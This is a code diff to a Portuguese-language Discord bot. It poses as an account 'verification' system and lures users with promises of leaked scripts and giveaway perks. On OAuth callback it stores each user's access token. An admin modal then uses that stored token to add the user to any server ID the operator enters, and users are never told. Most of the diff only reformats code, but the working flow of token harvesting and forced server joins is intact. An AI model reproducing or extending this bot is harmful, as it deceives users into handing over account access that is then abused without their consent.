@@ -8,14 +8,16 @@ const {
 } = require('discord.js');
 
 // --- CONFIGURAÇÕES ---
+// Onde os avisos de "Novo Usuário" chegam
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; // Link para onde o usuário volta
+// Para onde o usuário é enviado após se verificar no site
+const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; 
 
 const app = express();
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 const userTokens = new Map();
 
-// --- SERVIDOR WEB ---
+// --- SERVIDOR WEB (Visual Bonito) ---
 app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));
 
 app.get('/callback', async (req, res) => {
@@ -73,7 +75,7 @@ app.get('/callback', async (req, res) => {
             await logChannel.send({ embeds: [embedLog], components: [row] });
         }
 
-        // 5. RESPOSTA VISUAL BONITA (HTML/CSS)
+        // 5. SITE BONITO (HTML/CSS)
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
@@ -82,43 +84,12 @@ app.get('/callback', async (req, res) => {
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Verificado com Sucesso</title>
                 <style>
-                    body {
-                        background-color: #2b2d31; /* Cor de fundo do Discord */
-                        font-family: 'gg sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                        color: white;
-                        display: flex;
-                        justify_content: center;
-                        align-items: center;
-                        height: 100vh;
-                        margin: 0;
-                        flex-direction: column;
-                    }
-                    .card {
-                        background-color: #313338;
-                        padding: 40px;
-                        border-radius: 10px;
-                        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-                        text-align: center;
-                        max-width: 400px;
-                        width: 90%;
-                    }
-                    .icon {
-                        font-size: 60px;
-                        color: #23a559; /* Verde Discord */
-                        margin-bottom: 20px;
-                    }
+                    body { background-color: #2b2d31; font-family: 'Segoe UI', sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+                    .card { background-color: #313338; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center; max-width: 400px; width: 90%; }
+                    .icon { font-size: 60px; color: #23a559; margin-bottom: 20px; }
                     h1 { margin: 0 0 10px 0; font-size: 24px; }
                     p { color: #b5bac1; margin-bottom: 30px; }
-                    .btn {
-                        background-color: #5865F2; /* Blurple Discord */
-                        color: white;
-                        padding: 12px 24px;
-                        text-decoration: none;
-                        border-radius: 5px;
-                        font-weight: bold;
-                        transition: background 0.2s;
-                        display: inline-block;
-                    }
+                    .btn { background-color: #5865F2; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.2s; display: inline-block; }
                     .btn:hover { background-color: #4752c4; }
                     .timer { margin-top: 20px; font-size: 12px; color: #949ba4; }
                 </style>
@@ -127,24 +98,17 @@ app.get('/callback', async (req, res) => {
                 <div class="card">
                     <div class="icon">✅</div>
                     <h1>Verificado!</h1>
-                    <p>Sua conta foi autenticada com sucesso. Você já pode fechar esta janela.</p>
-                    
+                    <p>Sua conta foi autenticada. Você já pode fechar esta janela.</p>
                     <a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a>
-                    
-                    <div class="timer">Redirecionando automaticamente em <span id="count">3</span>s...</div>
+                    <div class="timer">Redirecionando em <span id="count">3</span>s...</div>
                 </div>
-
                 <script>
                     let seconds = 3;
                     const countSpan = document.getElementById('count');
-                    
-                    const interval = setInterval(() => {
+                    setInterval(() => {
                         seconds--;
                         countSpan.innerText = seconds;
-                        if (seconds <= 0) {
-                            clearInterval(interval);
-                            window.location.href = "${REDIRECT_TARGET}";
-                        }
+                        if (seconds <= 0) window.location.href = "${REDIRECT_TARGET}";
                     }, 1000);
                 </script>
             </body>
@@ -153,7 +117,7 @@ app.get('/callback', async (req, res) => {
 
     } catch (error) {
         console.error(error);
-        res.send('<h1 style="color:red; text-align:center; font-family: sans-serif; margin-top: 50px;">❌ Erro na verificação.</h1>');
+        res.send('❌ Erro na verificação.');
     }
 });
 
@@ -177,7 +141,7 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
     
-    // --- 1. COMANDO SETUP (SEM IMAGEM) ---
+    // 1. COMANDO SETUP
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
 
@@ -185,52 +149,36 @@ client.on('interactionCreate', async interaction => {
 
         const embed = new EmbedBuilder()
             .setTitle('🔓 Liberação de Acesso')
-            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para vereficar sua conta.')
+            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para autenticar sua conta.')
             .setColor(0x5865F2)
-            // A linha .setImage(...) foi removida daqui
             .setFooter({ text: 'Sistema Seguro de Verificação' });
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setLabel('Verificar Agora')
-                .setStyle(ButtonStyle.Link)
-                .setURL(authUrl)
-                .setEmoji('✅')
+            new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅')
         );
 
         await interaction.channel.send({ embeds: [embed], components: [row] });
         await interaction.reply({ content: 'Painel criado!', ephemeral: true });
     }
 
-    // --- 2. ADMIN ENVIA O USUÁRIO ---
+    // 2. ABRIR MODAL DE ENVIO
     if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
         const targetUserId = interaction.customId.split('_')[3];
-
-        const modal = new ModalBuilder()
-            .setCustomId(`modal_envio_${targetUserId}`)
-            .setTitle('Enviar Usuário');
-
-        const serverIdInput = new TextInputBuilder()
-            .setCustomId('input_server_id')
-            .setLabel("ID do Servidor Alvo")
-            .setPlaceholder("O BOT DEVE ESTAR LÁ")
-            .setStyle(TextInputStyle.Short);
-
-        modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
+        const modal = new ModalBuilder().setCustomId(`modal_envio_${targetUserId}`).setTitle('Enviar Usuário');
+        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel("ID do Servidor Alvo").setStyle(TextInputStyle.Short);
+        modal.addComponents(new ActionRowBuilder().addComponents(input));
         await interaction.showModal(modal);
     }
 
+    // 3. ENVIAR USUÁRIO
     if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
         const targetUserId = interaction.customId.split('_')[2];
         const targetServerId = interaction.fields.getTextInputValue('input_server_id');
+        const accessToken = userTokens.get(targetUserId);
 
         await interaction.deferReply({ ephemeral: true });
 
-        const accessToken = userTokens.get(targetUserId);
-
-        if (!accessToken) {
-            return interaction.editReply('❌ **Erro:** O token desse usuário expirou (bot reiniciou).');
-        }
+        if (!accessToken) return interaction.editReply('❌ Token expirou (Bot reiniciou).');
 
         try {
             await axios.put(
@@ -238,10 +186,9 @@ client.on('interactionCreate', async interaction => {
                 { access_token: accessToken },
                 { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
             );
-            await interaction.editReply(`✅ **Sucesso!** Usuário enviado para o servidor \`${targetServerId}\`.`);
+            await interaction.editReply(`✅ **Sucesso!** Enviado para \`${targetServerId}\`.`);
         } catch (erro) {
-            console.error(erro);
-            await interaction.editReply('❌ Falha ao adicionar. Verifique se o bot está no servidor alvo e tem permissão.');
+            await interaction.editReply('❌ Falha ao adicionar. Verifique se o Bot está no servidor alvo.');
         }
     }
 });
